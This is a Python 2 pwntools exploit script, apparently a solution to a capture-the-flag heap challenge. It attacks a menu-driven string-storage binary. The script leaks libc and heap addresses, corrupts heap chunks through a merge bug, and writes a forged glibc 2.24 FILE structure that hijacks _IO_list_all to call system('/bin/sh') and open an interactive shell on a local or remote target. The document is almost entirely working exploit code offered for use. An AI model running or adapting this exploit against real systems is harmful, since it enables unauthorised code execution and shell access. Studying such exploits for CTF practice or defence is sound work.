#!/usr/bin/env python2

from pwn import *
from qpwn import *
from sys import argv
context(binary='./pwn', log_level='debug')
context.terminal = ['tmux', 'splitw', '-h']

if args.INFO:
    context.log_level = 'info'
    
DEBUG = not args.REMOTE and not args.TEST
if args.REMOTE:
    p = remote(argv[1], int(argv[2]))
    libc = ELF('./libc.so.6')
elif args.TEST:
    p = process('./pwn', env={'LD_PRELOAD': './libc.so.6'})
    libc = ELF('./libc.so.6')
else:
    p = process('./pwn')
    libc = ELF('./libc-2.24.so')
elf = ELF('./pwn')
init(p, elf, context, args)
make_alias(p)

def menu(index):
    p.sla('>>>', str(index))

def create(size, content):
    menu(1)
    p.sla('Please enter the size of string :', str(size))
    if size:
        p.sa('Please enter the string :', content)

def show(index):
    menu(2)
    p.sla('Please input index :', str(index))

def delete(index):
    menu(3)
    p.sla('Please input index :', str(index))

def merge(index):
    menu(4)
    p.sla('Please enter the first string index :', str(index))
    p.sla('lease enter the second string index :', str(index))

def merges(ls):
    menu(5)
    p.ru('lease enter a sequence of strings to be merged :')
    p.sl(' '.join(map(str, ls)))

if __name__ == '__main__':
    #if args.REMOTE:
    #    p.sla('k')
    create(0x88, 'a\n')
    delete(0)
    create(0x98, 'a\n')
    create(0, '')
    show(1)
    leak = u64(p.ru('\x7f')[-6:].ljust(8, '\x00'))
    success('leak ' + hex(leak))
    libc.address = leak - 0x7ffff7dd4bd8 + 0x00007ffff7a13000
    #libc.address = leak - 0x7ffff7dd4bd8 + 0x00007ffff7a3c000
    success('libc ' + hex(libc.address))

    #gogogo('vmmap')
    delete(1)
    delete(0)
    create(0x18, 'a\n')
    delete(0)
    create(0, '')
    show(0)
    p.ru('are : ')
    heap_base = u64(p.r(6).ljust(8, '\x00')) - 0x90
    success('heap ' + hex(heap_base))
    create(0x3ff, 'a' * (0x408 - 0x6 * 2) + '\xa1\x01\n') # 1
    #merges([1, 0, 0])
    #create()
    #delete(2)
    #create(0x48, 'a\n')
    #create(0x)
    create(0x400, 'a\n') # 2
    create(0x38, 'a\n') # 3
    create(0xf8, 'a\n') # 4
    create(0x38, 'a\n')
    delete(2)
    merges([0, 0, 1])
    delete(3)
    delete(4)
    payload = gen(['a' * 0x30, 0x0, 0x61, 0x0, libc.sym['_IO_list_all']-0x10, 0x0, 0x1, 0x0, libc.search('/bin/sh').next(), [0xd8+0x30], libc.sym['_IO_file_jumps']+0xc0-0x8, [0xe8+0x30], libc.sym['system']])
    create(0x198, payload + '\n')#.ljust(0x155, '\x00') + '\n')
    #gogogo('x /20gx 0x0000555555756040\nheap bins')
    #delete()
    #delete()
    #gogogo('dir ../glibc/glibc-2.24/libio\ndir ../glibc/glibc-2.24/stdlib\nb genops.c:792')
    success(hex(libc.sym['_IO_list_all']))
    bc(0x7ffff7a915b0)
    menu(1)
    p.sla('Please enter the size of string :', str(1000))
    p.i()
